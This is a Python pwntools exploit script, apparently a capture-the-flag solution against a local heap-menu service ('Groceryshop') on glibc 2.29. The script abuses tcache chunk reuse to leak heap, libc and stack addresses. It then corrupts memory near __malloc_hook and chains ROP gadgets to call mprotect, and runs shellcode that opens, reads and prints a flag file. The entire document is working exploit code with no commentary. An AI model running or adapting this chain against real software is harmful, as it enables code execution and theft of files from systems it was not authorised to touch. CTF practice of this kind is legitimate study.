from pwn import *
import struct

context.arch = 'amd64'

###Util
def create(value,name):
    r.sendlineafter('choice : ','1')
    if type(value)!=type(0) and type(value)!=type(0.0):
        r.sendlineafter('value : ',value)
    else:
        r.sendlineafter('value : ',str(value))
    r.sendlineafter('name : ',name)

def delete(data,KEY='value'):
    r.sendlineafter('choice : ','2')
    if KEY=='value':
        r.sendlineafter('choice : ','1')
    else:
        r.sendlineafter('choice : ','2')
    if type(data)!=type(0) and type(data)!=type(0.0):
        r.sendlineafter(' : ',data)
    else:
        r.sendlineafter(' : ',str(data))

def show(data,KEY='value'):
    r.sendlineafter('choice : ','3')
    if KEY=='value':
        r.sendlineafter('choice : ','1')
    else:
        r.sendlineafter('choice : ','2')
    if type(data)!=type(0) and type(data)!=type(0.0):
        r.sendlineafter(' : ',data)
    else:
        r.sendlineafter(' : ',str(data))
    res = r.recvline()[:-1].split(b', ')
    res[0] = res[0].split(b' : ')[1]
    res[1] = res[1].split(b' : ')[1]
    return res

###Addr
#  libc2.29
malloc_hook_offset = 0x1e4c30
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
environ_offset = 0x1e7d60

###ROPgadget
L_add_rsp_0xa8 = 0x4513f
L_pop_rdi = 0x26542
L_pop_rsi = 0x26f9e
L_pop_rdx = 0x12bda6
L_pop_rax = 0x47cf8
L_sub_rax_rdx = 0x47c2d
L_syscall = 0xcf6c5

###Exploit
r = remote('127.0.0.1',10103)

for i in range(8):
    create(i+1,str(i).ljust(0xd7,'a'))
for i in range(8):
    delete(i+1,KEY='value')

create(4,'unreachable')
create('NAN','pivot')
create(0,'pivot2')
create(3,'rotate(tcache1)')
create(2,'tcache2')
create(1,'tcache3')
create(4,'victim')
delete(3,KEY='value')
delete(2,KEY='value')
delete(1,KEY='value')
delete('unreachable',KEY='name')

create(1,'reorder1')
create(2,'reorder2')
delete(1,KEY='value')
delete(2,KEY='value')
create(1,'\x00')
create(2,'tcache1')
create(3,'tcache2')
create(4,'overlap')
delete('pivot2',KEY='name')
delete(1,KEY='value')
heap_addr = u64(show(4,KEY='value')[0].ljust(8,b'\x00'))-0xcc0
print(hex(heap_addr))

create(5,p64(0xffefffffffffffff)+p64(heap_addr+0xce0))
unsorted_bin_addr = u64(show('-0x1.fffffffffffffp+1023',KEY='value')[0]+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

delete(5,KEY='value')
create(5,p64(0xffefffffffffffff)+p64(libc_base+environ_offset))
stack_addr = u64(show('-0x1.fffffffffffffp+1023',KEY='value')[0]+b'\x00\x00')
main_rbp = stack_addr-0xf8
print(hex(main_rbp))

create(6,b'a'*0x38+p64(0x41))
delete(5,KEY='value')
create(5,p64(0xffefffffffffffff)+p64(heap_addr+0xda0))
delete('-0x1.fffffffffffffp+1023',KEY='value')
delete(6,KEY='value')
create(6,b'a'*0x40+p64(libc_base+malloc_hook_offset-0x31))
arguments = b'/home/Groceryshop/flag'
create(7,arguments.rjust(0x37,b'a'))
ROPchain = p64(libc_base+L_pop_rdi)+p64((main_rbp-0x100+0x58)&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(17)+\
           p64(libc_base+L_sub_rax_rdx)+\
           p64(libc_base+L_syscall)+\
           p64(main_rbp-0x100+0x58)
shellcode = asm(f'''
                 mov rdi, {heap_addr+0xda0+0x37-len(arguments)}
                 xor rsi, rsi
                 push rsi
                 pop rdx
                 mov rax, 2
                 syscall
                 push rax
                 pop rdi
                 push rsi
                 pop rax
                 push rax
                 pop rdx
                 inc dh
                 mov rsi, {heap_addr+0xda0+0x37-len(arguments)}
                 syscall
                 xor rdi, rdi
                 inc edi
                 mov rsi, {heap_addr+0xda0+0x37-len(arguments)}
                 xor rdx, rdx
                 inc dh
                 push rdi
                 pop rax
                 syscall
                 xor rdi, rdi
                 mov rax, 0x3c
                 syscall
                 ''')
create(8,b'a'*0x31+p64(libc_base+L_add_rsp_0xa8)[:-1]+p64(0)+ROPchain+shellcode)
r.interactive()
